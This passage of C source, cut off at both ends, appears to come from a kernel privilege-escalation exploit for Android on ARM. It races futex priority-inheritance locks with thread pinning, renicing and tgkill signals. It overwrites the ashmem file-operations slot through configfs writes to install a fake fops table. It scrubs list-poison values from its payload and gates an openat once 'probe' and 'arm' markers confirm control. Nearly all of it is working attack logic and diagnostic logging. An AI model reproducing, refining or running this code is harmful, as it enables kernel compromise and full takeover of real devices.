      "v114 %s walk-wait seq=%d/%d waited=%ldms "
      "shdw=[%016llx %016llx %016llx %016llx] lshape=%d att=%lu "
      "vp=%d prio=%u page=%016llx probe_l=%016llx probe_s=%016llx "
      "wdone=%d win=%d ver=%d\n",
      tag, (int)atomic_load(&slide_heal_seq), want_seq, waited,
      (unsigned long long)slide_shdw_pc, (unsigned long long)slide_shdw_right,
      (unsigned long long)slide_shdw_left, (unsigned long long)slide_shdw_lock,
      atomic_load(&slide_last_copy_shape), (unsigned long)slide_gsr_attempt,
      slide_verdict_pending(), (unsigned)FAKE_WAITER_PRIO,
      (unsigned long long)page_base,
      (unsigned long long)(page_base + (uintptr_t)PROBE_MARK_OFF),
      (unsigned long long)PROBE_SCRATCH, slide_walk_done, slide_round_win,
      atomic_load(&slide_copy_version));
  if (marker != 0) {
    (void)util_frame_oracle_marker("v121b-post-erase", marker, marker_off);
  }
  util_frame_band_dump("post-erase");
  usleep((useconds_t)env_int_range("SLIDE_V114_SETTLE_MS", 150, 0, 5000) *
         1000);
}

static void slide_v114_fire(int otid, const char *tag, long kgate_ms) {
  slide_v97_verdict_window_pre_kill();
  if (slide_kill_gate(otid, tag, kgate_ms)) {
    errno = 0;
    long kr = syscall(SYS_tgkill, getpid(), otid, SIGUSR1);
    pr_warning("slide consumer tgkill owner=%d ret=%ld errno=%d tag=%s "
               "cpu=%d\n",
               otid, kr, errno, tag, sched_getcpu());
    return;
  }
  pr_warning("v114 %s kill-gate NO-KILL -> park (no fire)\n", tag);
  atomic_store(&slide_consume_stop, 1);
  slide_park_sleep();
}

static void slide_poison_scrub(unsigned char *base, size_t len,
                               const char *stage) {
  if (!env_flag("SLIDE_POISON_SCRUB", 1)) {
    return;
  }
  if (!base) {
    pr_warning("v119 poison-scrub[%s]: no payload template - skip\n", stage);
    return;
  }
  int fixes = 0;
  for (size_t off = 0; off + 8 <= len; off += 8) {
    uint64_t w = slide_get64(base, off);
    if ((w & 0xffffffffffffff00ULL) == 0xdead000000000000ULL) {
      put64(base, off, 0);
      pr_success("v119 poison-scrub[%s]: [0x%zx]=0x%016llx -> 0\n", stage, off,
                 (unsigned long long)w);
      fixes++;
    }
  }
  pr_info("v119 poison-scrub[%s]: span=0x%zx+0x%zx fixes=%d\n", stage,
          (size_t)(uintptr_t)base, len, fixes);
}

static void slide_v121e_mark(const char *when) {
  if (!slide_v121e_diag()) {
    return;
  }
  util_v121e_mark_readback(when);
}

static void slide_v121e_band(const char *when) {
  if (!slide_v121e_diag()) {
    return;
  }
  unsigned long long age_us = 0;
  if (slide_gsr_last_copy_ns) {
    uint64_t now = (uint64_t)gettime_ns();
    if (now > slide_gsr_last_copy_ns) {
      age_us = (now - slide_gsr_last_copy_ns) / 1000ULL;
    }
  }
  pr_warning("v121e arm band at-go when=%s pc=%016llx right=%016llx "
             "left=%016llx lock=%016llx lshape=%d cver=%d age_us=%llu\n",
             when ? when : "-", (unsigned long long)slide_shdw_pc,
             (unsigned long long)slide_shdw_right,
             (unsigned long long)slide_shdw_left,
             (unsigned long long)slide_shdw_lock,
             (int)atomic_load(&slide_last_copy_shape),
             (int)atomic_load(&slide_copy_version), age_us);
}

static void slide_v121e_walkstate(const char *when, long waited) {
  if (!slide_v121e_diag()) {
    return;
  }
  unsigned long rq_stale_ms = 0;
  if (slide_requeue_exit_ns) {
    uint64_t now = (uint64_t)gettime_ns();
    if (now > slide_requeue_exit_ns) {
      rq_stale_ms = (unsigned long)((now - slide_requeue_exit_ns) / 1000000ULL);
    }
  }
  pr_warning("v121e arm walkstate when=%s waited=%ld wdone=%d win=%d hseq=%d "
             "hreq=%d hack=%d hexit=%d stop=%d banked=%d unlocked=%d inrq=%d "
             "rq_stale_ms=%lu stage=%d cver=%d lshape=%d att=%lu vp=%d\n",
             when ? when : "-", waited, slide_walk_done, slide_round_win,
             (int)atomic_load(&slide_heal_seq),
             (int)atomic_load(&slide_heal_req),
             (int)atomic_load(&slide_heal_ack),
             (int)atomic_load(&slide_handler_exited),
             (int)atomic_load(&slide_consume_stop),
             (int)atomic_load(&slide_pc_win_banked),
             (int)atomic_load(&slide_probe_unlocked),
             (int)atomic_load(&slide_waiter_in_requeue), rq_stale_ms,
             (int)atomic_load(&slide_v114_stage),
             (int)atomic_load(&slide_copy_version),
             (int)atomic_load(&slide_last_copy_shape),
             (unsigned long)slide_gsr_attempt, slide_verdict_pending());
}

static void slide_v121e_timeline(void) {
  if (!slide_v121e_diag()) {
    return;
  }
  const long ns = 2147483647L;
  long d_stop_go = ns, d_go_blocked = ns, d_win_go = ns, d_e1b_go = ns,
       d_copy_go = ns;
  if (slide_v121e_stop_ns && slide_v121e_go_ns) {
    d_stop_go =
        (long)(((int64_t)slide_v121e_go_ns - (int64_t)slide_v121e_stop_ns) /
               1000);
  }
  if (slide_v121e_blocked_ns && slide_v121e_go_ns) {
    d_go_blocked =
        (long)(((int64_t)slide_v121e_blocked_ns - (int64_t)slide_v121e_go_ns) /
               1000);
  }
  if (slide_v121e_win_exit_ns && slide_v121e_go_ns) {
    d_win_go =
        (long)(((int64_t)slide_v121e_win_exit_ns - (int64_t)slide_v121e_go_ns) /
               1000);
  }
  if (slide_v121e_e1b_ns && slide_v121e_go_ns) {
    d_e1b_go =
        (long)(((int64_t)slide_v121e_e1b_ns - (int64_t)slide_v121e_go_ns) /
               1000);
  }
  if (slide_gsr_last_copy_ns && slide_v121e_go_ns) {
    d_copy_go =
        (long)(((int64_t)slide_v121e_go_ns - (int64_t)slide_gsr_last_copy_ns) /
               1000);
  }
  pr_warning("v121e arm fire-attempt scrub_ns=%llu stop_ns=%llu go_ns=%llu "
             "blocked_ns=%llu win_exit_ns=%llu e1b_unlock_ns=%llu "
             "last_copy_ns=%llu d_stop_go_us=%ld d_go_blocked_us=%ld "
             "d_win_exit_go_us=%ld d_e1b_go_us=%ld d_last_copy_go_us=%ld "
             "set_win=%d set_e1b=%d\n",
             (unsigned long long)slide_v121e_scrub_ns,
             (unsigned long long)slide_v121e_stop_ns,
             (unsigned long long)slide_v121e_go_ns,
             (unsigned long long)slide_v121e_blocked_ns,
             (unsigned long long)slide_v121e_win_exit_ns,
             (unsigned long long)slide_v121e_e1b_ns,
             (unsigned long long)slide_gsr_last_copy_ns, d_stop_go,
             d_go_blocked, d_win_go, d_e1b_go, d_copy_go,
             slide_v121e_win_exit_ns ? 1 : 0, slide_v121e_e1b_ns ? 1 : 0);
}

static void slide_v124_renice_insurance(void) {
  if (!env_int_range("SLIDE_V124_RENICE", 1, 0, 1)) {
    return;
  }
  int tids[2];
  int rc[2] = {0, 0};
  int nice[2] = {-99, -99};
  int n = 0;
  int otid = atomic_load(&slide_owner_tid);
  if (otid > 0) {
    tids[n] = otid;
    errno = 0;
    if (setpriority(PRIO_PROCESS, tids[n], 19) != 0) {
      rc[n] = errno ? errno : -1;
    }
    errno = 0;
    nice[n] = getpriority(PRIO_PROCESS, tids[n]);
    n++;
  }
  tids[n] = (int)getpid();
  errno = 0;
  if (setpriority(PRIO_PROCESS, tids[n], 19) != 0) {
    rc[n] = errno ? errno : -1;
  }
  errno = 0;
  nice[n] = getpriority(PRIO_PROCESS, tids[n]);
  n++;
  pr_warning("v124 renice insurance owner=%d rc=%d nice=%d main=%d rc=%d "
             "nice=%d (arm host stays 120 -> any owner/main waiter 139 "
             "loses at rtmutex:752)\n",
             otid > 0 ? otid : -1, rc[0], nice[0], (int)getpid(), rc[1],
             nice[1]);
}

static void slide_v124_witness(const char *tag) {
  if (!env_int_range("SLIDE_V124_WITNESS", 1, 0, 1)) {
    return;
  }
  int tids[4];
  const char *names[4];
  int n = 0;
  int wt = atomic_load(&slide_waiter_tid);
  if (wt > 0) {
    tids[n] = wt;
    names[n] = "victim";
    n++;
  }
  int ot = atomic_load(&slide_owner_tid);
  if (ot > 0) {
    tids[n] = ot;
    names[n] = "owner";
    n++;
  }
  int ht = atomic_load(&slide_arm_host_tid);
  if (ht > 0) {
    tids[n] = ht;
    names[n] = "host";
    n++;
  }
  tids[n] = (int)getpid();
  names[n] = "main";
  n++;
  char out[768];
  int off = snprintf(out, sizeof(out), "v124 witness %s:", tag);
  if (off < 0 || off >= (int)sizeof(out)) {
    off = (int)sizeof(out) - 1;
  }
  for (int i = 0; i < n; i++) {
    char st = '?';
    char wc[32];
    char sy[96];
    long prio = -1, nice = -1;
    char path[64];
    wc[0] = 0;
    sy[0] = 0;
    slide_owner_state_sample(tids[i], &st, wc, sizeof(wc));
    snprintf(path, sizeof(path), "/proc/%d/stat", tids[i]);
    int fd = open(path, O_RDONLY | O_CLOEXEC);
    if (fd >= 0) {
      char line[384];
      ssize_t r = read(fd, line, sizeof(line) - 1);
      close(fd);
      if (r > 0) {
        line[r] = 0;
        char *cp = strrchr(line, ')');
        if (cp && cp[1] == ' ') {
          if (sscanf(cp + 3,
                     "%*s %*s %*s %*s %*s %*s %*s %*s %*s %*s "
                     "%*s %*s %*s %*s %ld %ld",
                     &prio, &nice) != 2) {
            prio = -1;
            nice = -1;
          }
        }
      }
    }
    snprintf(path, sizeof(path), "/proc/%d/syscall", tids[i]);
    int yfd = open(path, O_RDONLY | O_CLOEXEC);
    if (yfd >= 0) {
      ssize_t r = read(yfd, sy, sizeof(sy) - 1);
      close(yfd);
      if (r > 0) {
        sy[r] = 0;
        char *nl = strchr(sy, '\n');
        if (nl) {
          *nl = 0;
        }
      }
    }
    int w =
        snprintf(out + off, sizeof(out) - (size_t)off,
                 " %s=%d:%c,wc=%s,prio=%ld,nice=%ld,sy=%s", names[i], tids[i],
                 st, wc[0] ? wc : "n/a", prio, nice, sy[0] ? sy : "n/a");
    if (w < 0 || off + w >= (int)sizeof(out)) {
      off = (int)sizeof(out) - 1;
      break;
    }
    off += w;
  }
  pr_warning("%s\n", out);
}

static void *slide_v143d_hc_watcher(void *arg) {
  (void)arg;
  long cap_ms = env_int_range("SLIDE_V143_PARK_GATE_MS", 30000, 1000, 600000);
  int last_r = -1;
  int last_e = 0;
  for (long waited = 0; waited < cap_ms; waited += 100) {
    struct pollfd pf;
    pf.fd = slide_v143_cmd_fd[0];
    pf.events = POLLIN;
    pf.revents = 0;
    errno = 0;
    last_r = poll(&pf, 1, 0);
    if (last_r > 0 && (pf.revents & POLLIN)) {
      slide_v143_gate_open = 1;
      pr_info("v143e H-C marker seen at %ldms -> gate open\n", waited);
      return NULL;
    }
    last_e = errno;
    usleep(100000);
  }
  pr_warning("v143e H-C watcher cap %ldms expired (last poll r=%d "
             "errno=%d) -> gate stays closed (v142 flow)\n",
             cap_ms, last_r, last_e);
  return NULL;
}

static int slide_v114_two_stage(int otid, long kgate_ms) {
  const int probe_only = env_flag("SLIDE_FRAME_PROBE_ONLY", 0);
  struct slide_v114_oracle po = slide_v114_oracle_for(
      1, (uint64_t)PROBE_SCRATCH, (uint64_t)ASHMEM_MISC_FOPS_SLOT,
      (size_t)PROBE_MARK_OFF, (size_t)ARM_MARK_OFF, SKB_DATA_DELTA);
  struct slide_v114_oracle ao = slide_v114_oracle_for(
      0, (uint64_t)PROBE_SCRATCH, (uint64_t)ASHMEM_MISC_FOPS_SLOT,
      (size_t)PROBE_MARK_OFF, (size_t)ARM_MARK_OFF, SKB_DATA_DELTA);
  pr_warning("v114 two-stage begin probe_only=%d scratch=%016llx "
             "probe_mark_off=0x%x probe_stream_off=0x%x "
             "arm_mark_off=0x%x arm_stream_off=0x%x\n",
             probe_only, (unsigned long long)PROBE_SCRATCH, (int)PROBE_MARK_OFF,
             (int)po.stream_off, (int)ARM_MARK_OFF, (int)ao.stream_off);
  slide_v124_renice_insurance();
  int probe_hseq_snap = atomic_load(&slide_heal_seq);
  atomic_store(&slide_v114_stage, SLIDE_V114_STAGE_PROBE);
  slide_poison_scrub((unsigned char *)payload_template(), (size_t)SKB_SEND_SIZE,
                     "probe");
  slide_v114_fire(otid, "v114-probe-fire", kgate_ms);
  slide_v114_wait_walk(1, "probe", po.marker, po.marker_off);
  int probe_owned =
      util_frame_oracle_marker("v114-probe", po.marker, po.marker_off);
  util_frame_band_dump("v114-probe");
  util_stack_page_scan("probe", (uint64_t)PROBE_SCRATCH);
  enum slide_v114_action act = slide_v114_next(
      SLIDE_V114_STAGE_PROBE,
      probe_owned == 1 ? SLIDE_V114_EV_PROBE_HIT : SLIDE_V114_EV_PROBE_MISS,
      probe_only);
  pr_warning("v114 probe verdict owned=%d action=%d\n", probe_owned, (int)act);
  slide_v121e_walkstate("probe-hit", 0);
  if (act != SLIDE_V114_ACT_FIRE_ARM) {
    if (env_flag("SLIDE_MISS_EXIT", 0)) {
      pr_warning("v140 SLIDE_MISS_EXIT=1 seen but UNWIRED: probe-miss "
                 "still parks (pending main review)\n");
    }
    pr_warning("v114 probe %s -> park, [SLOT] untouched (real ashmem "
               "fops)\n",
               probe_only ? "probe-only" : "miss");
    if (env_flag("SLIDE_V143_PARK_GATE", 1) && probe_owned == 0 &&
        !slide_v143_gate_open) {
      slide_v143_gate_open = 1;
      pr_info("v143d gate open (probe-miss owned=0)\n");
    }
    atomic_store(&slide_consume_stop, 1);
    slide_park_sleep();
  }
  long hexit_waited = 0;
  while (atomic_load(&slide_handler_exited) <= probe_hseq_snap &&
         hexit_waited < 1000) {
    usleep(10000);
    hexit_waited += 10;
  }
  if (atomic_load(&slide_handler_exited) <= probe_hseq_snap) {
    pr_warning("v118 arm prep handler-exit timeout -> abandon arm -> clean "
               "park\n");
    atomic_store(&slide_consume_stop, 1);
    slide_park_sleep();
  }
  pr_warning("v118 arm prep handler_exited=%d baseline=%d waited=%ldms\n",
             (int)atomic_load(&slide_handler_exited), probe_hseq_snap,
             hexit_waited);
  atomic_store(&slide_pc_win_banked, 0);
  atomic_store(&slide_heal_req, 0);
  atomic_store(&slide_heal_ack, 0);
  atomic_store(&slide_v114_stage, SLIDE_V114_STAGE_ARM);
  int v128_bump = env_int_range("SLIDE_LOCK_SLOT_BUMP", 16, 0, 64);
  if (v128_bump > 0) {
    atomic_fetch_add(&slide_lock_slot_bump, v128_bump);
  }
  pr_warning("v120 arm slot: probe slot retired, arm glk=%016llx\n",
             (unsigned long long)slide_lock_addr());
  usleep((useconds_t)env_int_range("SLIDE_V114_ARM_PAINT_MS", 100, 0, 5000) *
         1000);
  if (slide_paint_route() != 1) {
    pr_warning("v118 arm window unsupported on paint route=%d (tcp "
               "only)\n",
               slide_paint_route());
  }
  char host_pre_st[2] = {'?', '?'};
  char host_pre_wc[2][80];
  int host_pre_hy = 0;
  long host_pre_ms = 0;
  host_pre_wc[0][0] = 0;
  host_pre_wc[1][0] = 0;
  int host_tid = atomic_load(&slide_arm_host_tid);
  while (host_pre_ms < 100) {
    host_pre_hy ^= 1;
    slide_owner_state_sample(host_tid, &host_pre_st[host_pre_hy],
                             host_pre_wc[host_pre_hy], sizeof(host_pre_wc[0]));
    if ((host_pre_st[host_pre_hy] == 'S' || host_pre_st[host_pre_hy] == 'D') &&
        host_pre_st[host_pre_hy] == host_pre_st[host_pre_hy ^ 1] &&
        !strcmp(host_pre_wc[host_pre_hy], host_pre_wc[host_pre_hy ^ 1])) {
      break;
    }
    usleep(1000);
    host_pre_ms += 1;
  }
  slide_poison_scrub((unsigned char *)payload_template(), (size_t)SKB_SEND_SIZE,
                     "arm");
  if (env_flag("SLIDE_ARM_FROZEN", 0)) {
    long fz_waited_ms = 0;
    long fz_cap_ms = env_int_range("SLIDE_ARM_FROZEN_WAIT_MS", 2000, 10, 60000);
    atomic_store(&slide_frozen_paint_done, 0);
    atomic_store(&slide_frozen_paint_req, 0);
    slide_probe("frozen-paint-req");
    atomic_store(&slide_frozen_paint_req, 1);
    while (!atomic_load(&slide_frozen_paint_done) && fz_waited_ms < fz_cap_ms &&
           !slide_round_win && !atomic_load(&slide_consume_stop)) {
      usleep(1000);
      fz_waited_ms++;
    }
    if (atomic_load(&slide_frozen_paint_done)) {
      pr_warning("v140 frozen: single arm copy resident, paint_done "
                 "waited=%ldms (v126 stream inversion bypassed; one "
                 "frozen band, one trigger)\n",
                 fz_waited_ms);
    } else {
      pr_warning("v140 frozen: paint_done TIMEOUT waited=%ldms cap=%ldms "
                 "req=%d win=%d stop=%d -> fallback: current fixed-delay "
                 "GO path (v124 D2 gate decides; no blind fire)\n",
                 fz_waited_ms, fz_cap_ms, atomic_load(&slide_frozen_paint_req),
                 slide_round_win, atomic_load(&slide_consume_stop));
    }
  }
  slide_v121e_stamp(&slide_v121e_scrub_ns);
  slide_v121e_band("pre-go");
  slide_v121e_mark("pre-go");
  if (env_flag("SLIDE_PREGO_GATE", 0) &&
      util_v129_prego_gate(slide_dump_fd(), slide_lock_addr(), "pre-go") != 0) {
    pr_warning("v129 prego-gate REJECT -> no arm GO -> clean park (slot "
               "spent)\n");
    atomic_store(&slide_consume_stop, 1);
    slide_park_sleep();
  }
  slide_v124_witness("pre-go");
  if (slide_shdw_pc == 0) {
    pr_warning("v124 D2 discard: pre-go band pc==0 (heal/poison shape) -> "
               "no arm fire -> clean park\n");
    atomic_store(&slide_consume_stop, 1);
    slide_park_sleep();
  }
  atomic_store(&slide_arm_host_go, 1);
  slide_v121e_stamp(&slide_v121e_go_ns);
  slide_v121e_walkstate("go", 0);
  char host_st = '?';
  char host_wc[80];
  int host_moved = 0;
  long host_waited = 0;
  host_wc[0] = 0;
  while (host_waited < 1000) {
    slide_owner_state_sample(host_tid, &host_st, host_wc, sizeof(host_wc));
    host_moved = (host_st != host_pre_st[host_pre_hy]) ||
                 strcmp(host_wc, host_pre_wc[host_pre_hy]) != 0;
    if ((host_st == 'S' || host_st == 'D') && host_moved) {
      break;
    }
    if (slide_v121e_diag() && host_waited == 250) {
      slide_v121e_walkstate("go+250ms", host_waited);
      slide_v121e_band("go+250ms");
      slide_v121e_mark("go+250ms");
    }
    usleep(1000);
    host_waited += 1;
  }
  if ((host_st == 'S' || host_st == 'D') && host_moved) {
    pr_warning("v121c arm host blocked host=%d state=%c wchan=%s "
               "waited=%ldms (dormancy was %c/%s)\n",
               host_tid, host_st, host_wc, host_waited,
               host_pre_st[host_pre_hy], host_pre_wc[host_pre_hy]);
  } else {
    pr_warning("v121c arm host NOT blocked host=%d state=%c wchan=%s "
               "waited=%ldms dormancy=%c/%s (timeout - the host either "
               "parked before the go (consume_stop first) or never reached "
               "LOCK_PI(chain2); no arm walk)\n",
               host_tid, host_st, host_wc, host_waited,
               host_pre_st[host_pre_hy], host_pre_wc[host_pre_hy]);
  }
  slide_v121e_stamp(&slide_v121e_blocked_ns);
  slide_v121e_walkstate("blocked", host_waited);
  slide_v121e_mark("blocked");
  slide_v121e_timeline();
  slide_v124_witness("blocked");
  slide_v114_wait_walk(2, "arm", 0, 0);
  int arm_owned =
      util_frame_oracle_marker("v114-arm", ao.marker, ao.marker_off);
  atomic_store(&slide_consume_stop, 1);
  slide_v121e_stamp(&slide_v121e_stop_ns);
  act = slide_v114_next(SLIDE_V114_STAGE_ARM,
                        arm_owned == 1 ? SLIDE_V114_EV_ARM_HIT
                                       : SLIDE_V114_EV_ARM_MISS,
                        probe_only);
  pr_warning("v114 arm verdict owned=%d action=%d\n", arm_owned, (int)act);
  if (slide_shdw_pc != 0) {
    util_stack_page_scan("arm", (uint64_t)slide_shdw_pc);
  }
  if (act != SLIDE_V114_ACT_OPENAT) {
    if (env_flag("SLIDE_MISS_EXIT", 0)) {
      pr_warning("v140 SLIDE_MISS_EXIT=1 seen but UNWIRED: arm-miss "
                 "still parks (pending main review)\n");
    }
    pr_warning("v114 arm miss -> park (no openat)\n");
    slide_park_sleep();
  }
  util_mark_fops_armed("v114-arm-verified");
  pr_success("v114 two-stage ARMED: probe+arm markers proven -> openat "
             "allowed\n");
  if (env_flag("SLIDE_V143_PARK_GATE", 1) && slide_v143_cmd_fd[0] >= 0) {
    pthread_t hw;
    if (pthread_create(&hw, NULL, slide_v143d_hc_watcher, NULL) == 0) {
      pthread_detach(hw);
      pr_info("v143d H-C watcher spawned (B gate)\n");
    } else {
      pr_warning("v143d H-C watcher create failed errno=%d -> gate "
                 "stays closed (v142 flow)\n",
                 errno);
    }
  }
  return 1;
}

static void slide_v114_repair_llseek(int fd, const char *tag) {
  if (fd < 0 || !fake_fops) {
    return;
  }
  int ok = repair_fake_fops_llseek(fd);
  pr_warning("v114 llseek repair %s slot=%016llx value=%016llx ok=%d\n", tag,
             (unsigned long long)slide_v114_llseek_target((uint64_t)fake_fops),
             (unsigned long long)slide_v114_llseek_value(
                 (uint64_t)text_addr(NOOP_LLSEEK)),
             ok);
}

static void slide_v114_early_slot_restore(int fd, const char *tag) {
  if (fd < 0) {
    return;
  }
  uint64_t orig = ASHMEM_FOPS_STRUCT;
  ssize_t wr =
      configfs_write_once(fd, ASHMEM_MISC_FOPS_SLOT, &orig, sizeof(orig));
  pr_warning("v114 early slot restore %s wr=%zd\n", tag, wr);
}

static int slide_v114_chain_pending(void) {
  return getenv("SLIDE_TEXT_ADDR") != NULL;
}

void *slide_consumer_thread(void *arg __attribute__((unused))) {
  disable_rseq_for_thread();
  pin_to_core(CONSUMER_CORE);
  pr_info("slide consumer thread enter tid=%d\n", (int)syscall(SYS_gettid));

  if (env_flag("SLIDE_CONSUMER_DISABLE", 0)) {
    pr_info("slide consumer disabled by env\n");
    return NULL;
  }

  int seen = 0;
  for (;;) {
    int seq = atomic_load(&slide_consume_go);
    if (seq == 0 || seq == seen) {
      __asm__ volatile("yield" ::: "memory");
      if (atomic_load(&slide_consume_stop)) {
        return NULL;
      }
      continue;
    }

    if (!atomic_load(&slide_gsr_painted)) {
      continue;
    }
    seen = seq;
    atomic_store(&slide_consume_seen, seen);
    if (SLIDE_CONSUME_USEC) {
      usleep(SLIDE_CONSUME_USEC);
    } else {
      for (int spin = 0; spin < SLIDE_CONSUME_DELAY; spin++) {
        __asm__ volatile("yield" ::: "memory");
      }
    }
    pr_info("slide consumer GOBSERVED seq=%d waiter_tid=%d\n", seq,
            atomic_load(&slide_waiter_tid));
    if (env_flag("SLIDE_STRICT_GO", 0) &&
        atomic_load(&slide_consume_go) != seq) {
      int lost = atomic_load(&slide_consume_lost) + 1;
      atomic_store(&slide_consume_lost, lost);
      continue;
    }

    if (env_int_range("SLIDE_TCP_FIRE_BURST", 0, 0, 1000000) > 0 &&
        !env_flag("SLIDE_FIRE_ON_COPY", 0)) {
      long burst_waited_ms = 0;
      long burst_wait_ms =
          env_int_range("SLIDE_BURST_WAIT_MS", 30000, 0, 120000);
      while (!atomic_load(&slide_burst_done)) {
        if (burst_wait_ms > 0 && burst_waited_ms >= burst_wait_ms) {
          pr_warning("slide consumer burst timeout %ldms - firing to "
                     "EINTR-unstick (v64 latched)\n",
                     burst_waited_ms);
          break;
        }
        usleep(1000);
        burst_waited_ms += 1;
      }
    }
    int tid = atomic_load(&slide_waiter_tid);
    int calls = atomic_load(&slide_consume_calls);
    (void)calls;
    long ret = -1;
    int saved_errno = 0;
    if (!env_flag("SLIDE_NO_SCHED", 1)) {
      int nice = (int)env_int_range("SLIDE_CONSUME_NICE", 12, 1, 139);
      errno = 0;
      ret = sched_setattr_tid(tid, nice);
      saved_errno = errno;
    }
    if (!env_flag("SLIDE_FULLWALK_ONLY", 0)) {
      long kgate_ms = env_int_range("SLIDE_KILL_GATE_MS", 2000, 0, 60000);
      int early_won = 0;
      if (!env_flag("SLIDE_NO_SIG", 0)) {
        int otid = atomic_load(&slide_owner_tid);
        if (otid > 0) {
          int waited_us = 0;
          while (!atomic_load_explicit(&slide_owner_entering,
                                       memory_order_acquire)) {
            if (waited_us >= 200000) {
              pr_warning("slide owner_entering timeout %dus, firing "
                         "anyway\n",
                         waited_us);
              break;
            }
            usleep(10);
            waited_us += 10;
          }
          if (!env_flag("SLIDE_FAST_FIRE", 0)) {
            usleep(50000);
          }
          early_won = slide_win_detected();
          atomic_store(&slide_futex_gate, 1);
          if (env_flag("SLIDE_PAINT_GATE", 0)) {
            atomic_store(&slide_paint_gate, 1);
          }
          if (early_won) {
            slide_round_win = 1;
            atomic_store(&slide_consume_stop, 1);
            pr_success("[!] slide early-probe WIN (virgin-tree walk#1 "
                       "banked; fire skipped)\n");
          } else {
            int anchor_attempt = -1;
            long spins = 0;
            if (env_flag("SLIDE_FIRE_ON_COPY", 0)) {
              unsigned long before_att = slide_gsr_attempt;
              while (slide_gsr_attempt == before_att &&
                     !atomic_load(&slide_burst_done) && spins < 5000000) {
                __asm__ volatile("yield" ::: "memory");
                spins++;
              }
              anchor_attempt = (int)slide_gsr_attempt;
            }
            pr_info("slide consumer fire ctx att=%lu burst_done=%d "
                    "entering=%d spins=%ld age_ns=%llu "
                    "band=[%016llx %016llx %016llx %016llx] ver=%d\n",
                    (unsigned long)slide_gsr_attempt,
                    atomic_load(&slide_burst_done),
                    atomic_load_explicit(&slide_owner_entering,
                                         memory_order_acquire),
                    spins,
                    (unsigned long long)(gettime_ns() - slide_gsr_last_copy_ns),
                    (unsigned long long)slide_shdw_pc,
                    (unsigned long long)slide_shdw_right,
                    (unsigned long long)slide_shdw_left,
                    (unsigned long long)slide_shdw_lock,
                    atomic_load(&slide_copy_version));
            pr_info("slide consumer fire anchor_attempt=%d "
                    "owner_entering=%d walk_done=%d burst_done=%d\n",
                    anchor_attempt,
                    atomic_load_explicit(&slide_owner_entering,
                                         memory_order_acquire),
                    slide_walk_done, atomic_load(&slide_burst_done));
            pr_info("slide consumer fire IDENTITY word=%016llx\n",
                    (unsigned long long)slide_identity_word);
            int v144_lreject = 0;
            {
              const char *lt = slide_active_target();
              if (env_flag("SLIDE_V144_LGATE", 1) && lt &&
                  !strcmp(lt, "fops")) {
                uint64_t lglk = slide_lock_addr();
                uint64_t la = slide_shdw_left, lb = lglk;
                uint64_t ldist = la > lb ? la - lb : lb - la;
                uint64_t lmb = ldist / (1024ULL * 1024ULL);
                uint64_t lcap = (uint64_t)env_int_range("SLIDE_V144_LGATE_MB",
                                                        600, 50, 8000);
                if (la == 0) {
                  v144_lreject = 1;
                  pr_warning("v144 L-gate reject: shdw_left=0 (no copy shadow) "
                             "-> no kill, park path\n");
                } else if (lmb > lcap) {
                  v144_lreject = 1;
                  pr_warning(
                      "v144 L-gate reject dist=%lluMB > cap=%lluMB -> no "
                      "kill, park path (rerun process to resample L)\n",
                      (unsigned long long)lmb, (unsigned long long)lcap);
                } else {
                  pr_info("v144 L-gate pass dist=%lluMB cap=%lluMB\n",
                          (unsigned long long)lmb, (unsigned long long)lcap);
                }
              }
            }
            slide_probe("acq-block-set");
            slide_probe("sig-send");
            const char *v95_tgt = slide_active_target();
            if (v144_lreject) {
              pr_warning("slide v144 L-gate: kill skipped, common park path\n");
            } else if (v95_tgt && !strcmp(v95_tgt, "fops")) {
              char gstate = '?';
              char gwchan[80];
              slide_owner_state_sample(otid, &gstate, gwchan, sizeof(gwchan));
              if (otid <= 0) {
                pr_warning("slide v95 fire-gate owner tid=n/a - no kill\n");
              } else if (gstate == 'S' || gstate == 'D') {
                if (slide_v114_twostage()) {
                  slide_v114_two_stage(otid, kgate_ms);
                } else {
                  slide_v113_frame_gate();
                  slide_v97_verdict_window_pre_kill();
                  if (slide_kill_gate(otid, "fops-fire", kgate_ms)) {
                    errno = 0;
                    long kr = syscall(SYS_tgkill, getpid(), otid, SIGUSR1);
                    pr_warning(
                        "slide v95 fire-gate kill (owner was blocked)\n");
                    pr_info("slide v95 fire-gate blocked owner=%d state=%c "
                            "wchan=%s\n",
                            otid, gstate, gwchan[0] ? gwchan : "n/a");
                    pr_warning(
                        "slide consumer tgkill owner=%d ret=%ld errno=%d\n",
                        otid, kr, errno);
                  }
                }
              } else {
                pr_warning("slide v95 fire-gate owner R - waiting for "
                           "blocked (n=0)\n");
                long waited_ms = 0;
                for (int n = 1; waited_ms < 10000; n++) {
                  usleep(100000);
                  waited_ms += 100;
                  slide_owner_state_sample(otid, &gstate, gwchan,
                                           sizeof(gwchan));
                  if ((n % 10) == 0) {
                    pr_warning("slide v95 fire-gate owner R - waiting for "
                               "blocked (n=%d)\n",
                               n);
                  }
                  if (gstate == 'S' || gstate == 'D') {
                    if (slide_v114_twostage()) {
                      slide_v114_two_stage(otid, kgate_ms);
                    } else {
                      slide_v113_frame_gate();
                      slide_v97_verdict_window_pre_kill();
                      if (slide_kill_gate(otid, "fops-rwait-fire", kgate_ms)) {
                        errno = 0;
                        long kr = syscall(SYS_tgkill, getpid(), otid, SIGUSR1);
                        pr_warning("slide v95 fire-gate kill (R-waited=%ld)\n",
                                   waited_ms);
                        pr_info("slide v95 fire-gate blocked owner=%d state=%c "
                                "wchan=%s\n",
                                otid, gstate, gwchan[0] ? gwchan : "n/a");
                        pr_warning("slide consumer tgkill owner=%d ret=%ld "
                                   "errno=%d\n",
                                   otid, kr, errno);
                      }
                    }
                    break;
                  }
                }
                if (gstate != 'S' && gstate != 'D') {
                  pr_warning("slide v95 fire-gate timeout owner still R - "
                             "no kill, park path\n");
                }
              }
            } else {
              if (slide_kill_gate(otid, "selinux-fire", kgate_ms)) {
                errno = 0;
                long kr = syscall(SYS_tgkill, getpid(), otid, SIGUSR1);
                pr_warning("slide consumer tgkill owner=%d ret=%ld errno=%d\n",
                           otid, kr, errno);
              }
            }
            slide_probe("sig-sent");
            atomic_store(&slide_fire_done, 1);
          }
        }
      }
      {
        int won = early_won;
        int enforce_seen = slide_enforce_value();
        if (!early_won) {
          if (!env_flag("SLIDE_FAST_FIRE", 0)) {
            usleep(10000);
          }
          long win_poll_ms = (long)env_int_range("SLIDE_WAIT_SECONDS",
                                                 SLIDE_WAIT_SECONDS, 1, 120) *
                             1000L;
          long win_waited_ms = 0;
          while (!slide_win_detected() && win_waited_ms < win_poll_ms &&
                 !atomic_load(&slide_consume_stop)) {
            usleep(10000);
            win_waited_ms += 10;
